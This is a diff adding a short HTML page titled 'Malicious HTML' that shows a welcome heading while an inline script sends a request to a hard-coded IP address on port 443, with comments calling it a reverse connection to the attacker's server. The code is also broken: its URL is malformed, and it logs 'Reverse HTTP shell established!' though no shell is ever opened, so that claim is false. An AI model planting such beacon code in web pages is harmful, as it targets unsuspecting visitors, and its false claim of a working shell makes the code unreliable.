@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious HTML</title>
+</head>
+<body>
+    <h1>Welcome to my site!</h1>
+    <script>
+        // Attempt to open a reverse HTTP connection to the attacker's server
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "http:/92.107.65.18:443/receive_payload", true); // Replace attacker-ip with your IP
+        xhr.send();
+
+        // Optionally, send additional data to the attacker
+        xhr.onload = function() {
+            // Execute additional commands or provide feedback
+            console.log("Reverse HTTP shell established!");
+        }
+    </script>
+</body>
+</html>
